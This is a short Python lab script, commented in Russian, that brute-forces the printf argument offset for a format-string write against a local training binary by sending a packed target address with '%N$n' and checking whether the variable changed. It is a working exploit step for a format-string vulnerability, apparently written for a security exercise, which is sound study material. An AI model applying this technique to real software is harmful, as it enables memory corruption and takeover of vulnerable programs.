#!/usr/bin/env python3
# Подбор позиции, на которой printf видит нашу строку формата как
# очередной аргумент. Адрес target лежит первыми четырьмя байтами
# строки, поэтому нужная позиция ищется простым перебором.
#
# Запускать внутри контейнера p6-lab:
#   python3 scripts/find_offset.py

import struct
import subprocess
import sys

TARGET = 0x0804C014  # nm -n build/fmtwrite | grep target
BINARY = "./build/fmtwrite"

for offset in range(1, 100):
    payload = struct.pack("<I", TARGET) + f"%{offset}$n".encode() + b"\n"
    try:
        result = subprocess.run(
            [BINARY],
            input=payload,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=2,
        )
    except subprocess.TimeoutExpired:
        continue

    out = result.stdout
    if b"target = 0x00000004" in out:
        print(f"offset = {offset}")
        print(f"payload = {payload!r}")
        print(out.decode("utf-8", "replace"))
        sys.exit(0)

print("offset не найден")
sys.exit(1)
